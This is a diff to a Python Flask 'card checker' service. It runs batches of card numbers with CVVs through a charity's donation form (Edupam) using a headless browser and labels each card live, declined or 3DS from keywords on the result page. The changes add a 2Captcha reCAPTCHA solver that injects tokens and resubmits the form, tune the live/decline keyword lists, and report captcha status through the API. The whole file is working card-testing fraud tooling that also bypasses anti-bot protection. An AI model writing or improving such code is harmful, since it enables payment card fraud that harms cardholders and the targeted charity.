@@ -5,7 +5,7 @@ import re
 import threading
 import time
 from datetime import datetime
-from playwright.sync_api import sync_playwright
+from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
 import requests
 import logging
 from datetime import datetime
@@ -44,64 +44,149 @@ checking_status = {
 }
 
 
+class CaptchaSolver:
+    """Clase para resolver captchas usando 2Captcha"""
+    
+    def __init__(self, api_key):
+        self.api_key = api_key
+        self.base_url = "https://2captcha.com"
+        
+    def solve_recaptcha_v2(self, site_key, page_url):
+        """Resolver reCAPTCHA v2"""
+        try:
+            if not self.api_key:
+                logger.warning("⚠️ API key de 2Captcha no configurada")
+                return None
+            
+            # Enviar captcha a 2Captcha
+            params = {
+                'key': self.api_key,
+                'method': 'userrecaptcha',
+                'googlekey': site_key,
+                'pageurl': page_url,
+                'json': 1
+            }
+            
+            logger.info(f"🔄 Enviando reCAPTCHA v2 a 2Captcha...")
+            response = requests.post(f"{self.base_url}/in.php", data=params, timeout=30)
+            result = response.json()
+            
+            if result.get('status') != 1:
+                logger.error(f"❌ Error 2Captcha: {result.get('error_text', 'Unknown error')}")
+                return None
+            
+            captcha_id = result['request']
+            logger.info(f"✅ Captcha enviado. ID: {captcha_id}")
+            
+            # Esperar solución (hasta 2 minutos)
+            for i in range(24):  # 24 * 5 = 120 segundos
+                time.sleep(5)
+                params = {
+                    'key': self.api_key,
+                    'action': 'get',
+                    'id': captcha_id,
+                    'json': 1
+                }
+                
+                response = requests.get(f"{self.base_url}/res.php", params=params, timeout=30)
+                result = response.json()
+                
+                if result.get('status') == 1:
+                    logger.info(f"✅ Captcha resuelto en {(i+1)*5} segundos")
+                    return result['request']
+                elif result.get('request') == 'CAPCHA_NOT_READY':
+                    if (i+1) % 3 == 0:  # Log cada 15 segundos
+                        logger.info(f"⏳ Captcha no listo... {i+1}/24 intentos")
+                    continue
+                else:
+                    logger.error(f"❌ Error al resolver captcha: {result.get('error_text', 'Unknown error')}")
+                    return None
+            
+            logger.error("❌ Tiempo de espera agotado para captcha (2 minutos)")
+            return None
+            
+        except Exception as e:
+            logger.error(f"❌ Error en solve_recaptcha_v2: {e}")
+            return None
+
+
 class PaymentAnalyzer:
     """Analizador de respuestas de pagos para Edupam"""
     
     @staticmethod
     def analyze_payment_result(page, current_url, card_last4):
-        """Versión simplificada que LOGGEA lo que encuentra"""
+        """Versión mejorada con lógica más precisa"""
         evidence = []
         final_status = 'unknown'
         
         try:
             page_content = page.content()
-            page_content_lower = page_content.lower()
+            page_content_lower = page.content().lower()
             current_url_lower = current_url.lower()
             
-            # ✅ LOGGEA TODO EL CONTENIDO (útil para debug)
             logger.info(f"🔍 ANALIZANDO para ****{card_last4}")
             logger.info(f"🔍 URL: {current_url}")
-            logger.info(f"🔍 CONTENIDO (300 chars): {page_content[:300]}")
             
-            # LIVE - busca ESTAS palabras EXACTAS
-            if '¡muchas gracias' in page_content_lower or 'muchas gracias' in page_content_lower:
-                final_status = 'live'
-                evidence.append('LIVE: palabra "Muchas gracias" encontradas')
-                logger.info(f"ENCONTRADO 'muchas gracias' - Es live")
-
-            # DEAD - busca ESTAS palabras
-            elif 'rechazada' in page_content_lower:
-                final_status = 'decline'
-                evidence.append('DEAD: palabra "rechazada" encontrada')
-                logger.info(f"❌ ENCONTRADO 'rechazada' - ES DEAD")
-            elif 'incorrecto' in page_content_lower:
-                final_status = 'decline'
-                evidence.append('DEAD: palabra "incorrecto" encontrada')
-                logger.info(f"❌ ENCONTRADO 'incorrecto' - ES DEAD")
-            elif 'venció' in page_content_lower:
-                final_status = 'decline'
-                evidence.append('DEAD: palabra "venció" encontrada')
-                logger.info(f"❌ ENCONTRADO 'venció' - ES DEAD")
-            elif 'admite' in page_content_lower:
-                final_status = 'decline'
-                evidence.append('DEAD: palabra "admite" encontrada')
-                logger.info(f"❌ ENCONTRADO 'admite' - ES DEAD")
+            # DEBUG: Ver contenido relevante
+            debug_content = page_content_lower[:500]
+            logger.info(f"🔍 CONTENIDO (500 chars): {debug_content}")
             
-            # 3DS - busca ESTAS palabras
-            elif '3d' in page_content_lower:
-                final_status = 'threeds'
-                evidence.append('3DS: palabra "3d" encontrada')
-                logger.info(f"🛡️ ENCONTRADO '3d' - ES 3D")
-            elif 'secure' in page_content_lower:
-                final_status = 'threeds'
-                evidence.append('3DS: palabra "secure" encontrada')
-                logger.info(f"🛡️ ENCONTRADO 'secure' - ES 3D")
+            # 1. Buscar palabras EXACTAS de DECLINE primero (más específico)
+            decline_keywords = [
+                'has been declined',
+                'rechazada',
+                'declined',
+                'ocurrió un error',
+                'incorrecto',
+                'venció',
+                'admite',
+                'no válida',
+                'invalid',
+                'error en la transacción',
+                'card has been declined'
+            ]
             
-            # Si no encuentra NADA
-            else:
-                final_status = 'unknown'
-                evidence.append('NO se encontraron palabras clave')
-                logger.info(f"❓ NO se encontraron palabras clave")
+            for keyword in decline_keywords:
+                if keyword in page_content_lower:
+                    final_status = 'decline'
+                    evidence.append(f'DEAD: "{keyword}" encontrado')
+                    logger.info(f"❌ ENCONTRADO '{keyword}' - ES DEAD")
+                    break
+            
+            # 2. Si no es DEAD, buscar LIVE
+            if final_status != 'decline':
+                if '¡muchas gracias' in page_content_lower or 'muchas gracias' in page_content_lower:
+                    final_status = 'live'
+                    evidence.append('LIVE: palabra "Muchas gracias" encontradas')
+                    logger.info(f"✅ ENCONTRADO 'muchas gracias' - Es LIVE")
+                elif 'pago exitoso' in page_content_lower or 'success' in page_content_lower:
+                    final_status = 'live'
+                    evidence.append('LIVE: palabra de éxito encontrada')
+                    logger.info(f"✅ ENCONTRADO palabra de éxito - Es LIVE")
+            
+            # 3. Solo buscar 3D Secure si no es LIVE ni DEAD
+            if final_status == 'unknown':
+                # Buscar específicamente en contexto de 3D
+                if '3d secure' in page_content_lower or '3-d secure' in page_content_lower:
+                    final_status = 'threeds'
+                    evidence.append('3DS: "3D Secure" encontrado')
+                    logger.info(f"🛡️ ENCONTRADO '3D Secure' - ES 3DS")
+                elif 'authentication' in page_content_lower and 'secure' in page_content_lower:
+                    final_status = 'threeds'
+                    evidence.append('3DS: contexto de autenticación seguro encontrado')
+                    logger.info(f"🛡️ ENCONTRADO contexto de autenticación - ES 3DS")
+                # Evitar falsos positivos: solo marcar "secure" como 3DS si está en contexto de pago
+                elif 'secure' in page_content_lower:
+                    # Verificar contexto - no marcar si es parte de "high quality" u otras frases
+                    if 'educación de alta calidad' not in page_content_lower:
+                        final_status = 'threeds'
+                        evidence.append('3DS: palabra "secure" encontrada')
+                        logger.info(f"🛡️ ENCONTRADO 'secure' - ES 3DS")
+            
+            # 4. Si aún es unknown
+            if final_status == 'unknown':
+                evidence.append('NO se encontraron palabras clave claras')
+                logger.info(f"❓ NO se encontraron palabras clave claras")
             
         except Exception as e:
             evidence.append(f'Error: {str(e)}')
@@ -113,6 +198,8 @@ class PaymentAnalyzer:
             'evidence': evidence,
             'url': current_url
         }
+
+
 class EdupamChecker:
     def __init__(self, headless=True):
         self.base_url = EDUPAM_BASE_URL
@@ -127,6 +214,7 @@ class EdupamChecker:
             'codigo': ''
         }
         self.analyzer = PaymentAnalyzer()
+        self.captcha_solver = CaptchaSolver(API_KEY_2CAPTCHA) if API_KEY_2CAPTCHA else None
     
     def parse_card_data(self, card_string):
         """Parsear string de tarjeta en formato: NUMERO|MES|AÑO|CVV"""
@@ -204,6 +292,129 @@ class EdupamChecker:
             return True
         except Exception as e:
             logger.error(f"Error llenando tarjeta: {e}")
+            return False
+    
+    def solve_captcha_if_present(self, page, card_last4):
+        """Detectar y resolver captcha si está presente"""
+        try:
+            # Esperar un momento para que cargue el captcha si existe
+            time.sleep(3)
+            
+            # Verificar si hay reCAPTCHA v2 presente
+            captcha_found = False
+            site_key = None
+            
+            # Buscar diferentes patrones de reCAPTCHA
+            selectors_to_check = [
+                'div[data-sitekey]',
+                '.g-recaptcha',
+                'iframe[src*="google.com/recaptcha"]',
+                'iframe[title*="reCAPTCHA"]'
+            ]
+            
+            for selector in selectors_to_check:
+                try:
+                    if page.locator(selector).count() > 0:
+                        captcha_found = True
+                        logger.info(f"🛡️ Captcha detectado con selector: {selector}")
+                        
+                        # Intentar obtener site-key
+                        if 'data-sitekey' in selector:
+                            site_key = page.locator(selector).first.get_attribute('data-sitekey')
+                        else:
+                            # Buscar el div con data-sitekey dentro del contenedor
+                            site_key = page.locator(f'{selector} [data-sitekey]').first.get_attribute('data-sitekey')
+                            if not site_key:
+                                # Intentar obtener del iframe
+                                iframe_src = page.locator('iframe[src*="google.com/recaptcha"]').first.get_attribute('src')
+                                if iframe_src:
+                                    # Extraer site-key de la URL del iframe
+                                    match = re.search(r'k=([^&]+)', iframe_src)
+                                    if match:
+                                        site_key = match.group(1)
+                        
+                        if site_key:
+                            logger.info(f"✅ Site-key encontrado: {site_key[:20]}...")
+                        break
+                except:
+                    continue
+            
+            if not captcha_found:
+                logger.info(f"✅ No se detectó captcha para ****{card_last4}")
+                return True
+            
+            if not site_key:
+                logger.warning(f"⚠️ Captcha detectado pero no se pudo obtener site-key para ****{card_last4}")
+                return False
+            
+            if not self.captcha_solver:
+                logger.error(f"❌ API key de 2Captcha no configurada para ****{card_last4}")
+                return False
+            
+            # Resolver captcha
+            logger.info(f"🔄 Resolviendo captcha para ****{card_last4}...")
+            page_url = page.url
+            solution = self.captcha_solver.solve_recaptcha_v2(site_key, page_url)
+            
+            if not solution:
+                logger.error(f"❌ No se pudo resolver el captcha para ****{card_last4}")
+                return False
+            
+            logger.info(f"✅ Captcha resuelto para ****{card_last4}")
+            
+            # Inyectar la solución en la página
+            try:
+                # Ejecutar script para llenar el campo g-recaptcha-response
+                page.evaluate(f"""
+                    () => {{
+                        // Buscar el textarea de respuesta
+                        const responseField = document.getElementById('g-recaptcha-response');
+                        if (responseField) {{
+                            responseField.value = '{solution}';
+                            responseField.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                            console.log('✅ Captcha solution injected');
+                            return true;
+                        }}
+                        
+                        // Si no existe, intentar encontrar por nombre
+                        const responseByName = document.querySelector('[name="g-recaptcha-response"]');
+                        if (responseByName) {{
+                            responseByName.value = '{solution}';
+                            responseByName.dispatchEvent(new Event('change', {{ bubbles: true }}));
+                            console.log('✅ Captcha solution injected by name');
+                            return true;
+                        }}
+                        
+                        // Crear campo si no existe
+                        const newField = document.createElement('textarea');
+                        newField.id = 'g-recaptcha-response';
+                        newField.name = 'g-recaptcha-response';
+                        newField.style.display = 'none';
+                        newField.value = '{solution}';
+                        document.body.appendChild(newField);
+                        console.log('✅ Created and injected captcha solution');
+                        return true;
+                    }}
+                """)
+                
+                # Pequeña espera para que se procese
+                time.sleep(2)
+                
+                # Volver a hacer clic en el botón de donar después de resolver captcha
+                btn = page.locator('#btn-donation')
+                if btn.count() > 0:
+                    btn.click()
+                    logger.info(f"✅ Re-enviando formulario con captcha resuelto para ****{card_last4}")
+                    time.sleep(3)  # Esperar después del segundo envío
+                
+                return True
+                
+            except Exception as e:
+                logger.error(f"❌ Error inyectando solución de captcha para ****{card_last4}: {e}")
+                return False
+                
+        except Exception as e:
+            logger.error(f"❌ Error en solve_captcha_if_present para ****{card_last4}: {e}")
             return False
 
     def check_single_card(self, card_string, amount=50):
@@ -285,16 +496,22 @@ class EdupamChecker:
             
             btn.click()
             
-            # Esperar
-            logger.info(f"10. Esperando respuesta (8 segundos)...")
-            time.sleep(8)
+            # Intentar resolver captcha si aparece
+            captcha_solved = True
+            if self.captcha_solver:
+                logger.info(f"10. Verificando captcha para ****{card_last4}...")
+                captcha_solved = self.solve_captcha_if_present(page, card_last4)
+            
+            # Esperar respuesta después del captcha (o sin captcha)
+            wait_time = 10 if captcha_solved else 5
+            logger.info(f"11. Esperando respuesta ({wait_time} segundos)...")
+            time.sleep(wait_time)
             
             # DEBUG EXTREMO
-            logger.info(f"11. URL DESPUÉS de enviar: {page.url}")
+            logger.info(f"12. URL DESPUÉS de enviar: {page.url}")
             page_text = page.content()
-            logger.info(f"12. HTML (200 chars): {page_text[:200]}")
+            logger.info(f"13. HTML (200 chars): {page_text[:200]}")
             
-            # Tomar screenshot ÚNICO para esta tarjeta
             # Tomar screenshot ÚNICO para esta tarjeta
             screenshot_b64 = None
             try:
@@ -334,8 +551,8 @@ class EdupamChecker:
                 # 6. Tomar screenshot
                 screenshot_bytes = page.screenshot(full_page=True)
                 screenshot_b64 = base64.b64encode(screenshot_bytes).decode('utf-8')
-                logger.info(f"13. 📸 Screenshot ÚNICO tomado para ****{card_last4}")
-                logger.info(f"13. {screenshot_b64}")
+                logger.info(f"14. 📸 Screenshot ÚNICO tomado para ****{card_last4}")
+                
             except Exception as e:
                 logger.error(f"Error screenshot: {e}")
             
@@ -356,32 +573,38 @@ class EdupamChecker:
                 'ERROR': '⚠️ Error desconocido - Verificación manual requerida'
             }
             
+            # Añadir información sobre captcha
+            evidence = analysis['evidence']
+            if not captcha_solved and self.captcha_solver:
+                evidence.append('⚠️ No se pudo resolver captcha')
+            
             result = {
                 'success': True,
                 'status': final_status,
                 'original_status': messages.get(final_status, 'Estado desconocido'),
-                'message': ', '.join(analysis['evidence']),
+                'message': ', '.join(evidence),
                 'response': {
                     'url': analysis['url'],
                     'evidence': analysis['evidence'],
                     'screenshot': screenshot_b64,
-                    'timestamp': datetime.now().isoformat()
+                    'timestamp': datetime.now().isoformat(),
+                    'captcha_solved': captcha_solved
                 },
                 'card': f"****{card_last4}",
                 'gate': 'Edupam',
                 'amount': amount
             }
             
-            logger.info(f"14. ✅ Verificación COMPLETADA para ****{card_last4}: {final_status}")
+            logger.info(f"15. ✅ Verificación COMPLETADA para ****{card_last4}: {final_status}")
             
             # CERRAR TODO
-            logger.info(f"15. Cerrando recursos...")
+            logger.info(f"16. Cerrando recursos...")
             try:
                 page.close()
                 context.close()
                 browser.close()
                 playwright.stop()
-                logger.info(f"16. ✅ Recursos CERRADOS para ****{card_last4}")
+                logger.info(f"17. ✅ Recursos CERRADOS para ****{card_last4}")
             except Exception as e:
                 logger.error(f"Error cerrando: {e}")
             
@@ -406,6 +629,8 @@ class EdupamChecker:
                 'message': f'Error: {str(e)[:100]}',
                 'card': card_last4
             }
+
+
 # ========== FUNCIONES DEL WORKER ==========
 
 def process_cards_worker(cards, amount, stop_on_live):
@@ -488,6 +713,7 @@ def process_cards_worker(cards, amount, stop_on_live):
     
     checking_status['active'] = False
 
+
 # ========== ENDPOINTS API ==========
 
 @app.route('/')
@@ -496,7 +722,7 @@ def index():
     return jsonify({
         "status": "online",
         "service": "Lattice Checker API (Edupam)",
-        "version": "2.0",
+        "version": "2.1",
         "endpoints": {
             "health": "/api/health",
             "status": "/api/status",
@@ -519,8 +745,13 @@ def health_check():
     return jsonify({
         'status': 'online',
         'service': 'Lattice Checker API',
-        'version': '2.0',
-        'timestamp': datetime.now().isoformat()
+        'version': '2.1',
+        'timestamp': datetime.now().isoformat(),
+        'features': {
+            'captcha_support': bool(API_KEY_2CAPTCHA),
+            'screenshots': True,
+            'multi_card_check': True
+        }
     })
 
 @app.route('/api/status', methods=['GET'])
@@ -534,7 +765,8 @@ def get_status():
         'threeds': checking_status['threeds'],
         'error': checking_status['error'],
         'current': checking_status['current'],
-        'total': len(checking_status['results'])
+        'total': len(checking_status['results']),
+        'captcha_enabled': bool(API_KEY_2CAPTCHA)
     })
 
 @app.route('/api/check-card', methods=['POST'])
@@ -642,7 +874,8 @@ def check_cards():
         'success': True,
         'message': f'Verificación iniciada para {len(valid_cards)} tarjetas',
         'total': len(valid_cards),
-        'amount': amount
+        'amount': amount,
+        'captcha_enabled': bool(API_KEY_2CAPTCHA)
     })
 
 @app.route('/api/results', methods=['GET'])
@@ -656,7 +889,8 @@ def get_results():
             'decline': checking_status['decline'],
             'threeds': checking_status['threeds'],
             'error': checking_status['error']
-        }
+        },
+        'captcha_enabled': bool(API_KEY_2CAPTCHA)
     })
 
 @app.route('/api/cancel', methods=['POST'])
@@ -677,6 +911,11 @@ if __name__ == '__main__':
     logger.info(f"   Headless: {HEADLESS}")
     logger.info(f"   Donation amount: ${DONATION_AMOUNT}")
     logger.info(f"   Max workers: {MAX_WORKERS}")
-    logger.info(f"   2Captcha: {'enabled' if API_KEY_2CAPTCHA else 'disabled'}")
+    logger.info(f"   2Captcha: {'ENABLED' if API_KEY_2CAPTCHA else 'DISABLED'}")
+    
+    if API_KEY_2CAPTCHA:
+        logger.info(f"   Captcha Solver: ✅ Integrado y listo")
+    else:
+        logger.warning(f"   Captcha Solver: ⚠️ NO configurado - Los captchas no se resolverán")
     
     app.run(host='0.0.0.0', port=port, debug=debug)
